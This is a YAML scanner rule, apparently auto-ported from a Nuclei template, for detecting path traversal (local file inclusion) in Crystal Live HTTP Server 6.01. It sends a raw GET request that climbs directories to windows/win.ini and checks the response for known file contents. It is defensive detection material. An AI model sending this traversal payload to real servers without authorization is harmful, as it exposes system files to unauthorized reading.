schema_version: 1
id: "cortex.community:crystal-live-server-lfi"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "http.preserve_raw_path.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Crystal Live HTTP Server 6.01 - Local File Inclusion"
  description: "Crystal Live HTTP Server 6.01 is vulnerable to local file inclusion. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://cxsecurity.com/issue/WLB-2019110127"
  cwes: [23]
  tags: ["lfi", "crystal", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/../../../../../../../../../../../../windows/win.ini", path_mode: "preserve_raw" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - contains: { left: { ref: "steps.probe0.body" }, right: { value: "bit app support" } }
      - contains: { left: { ref: "steps.probe0.body" }, right: { value: "fonts" } }
      - contains: { left: { ref: "steps.probe0.body" }, right: { value: "extensions" } }
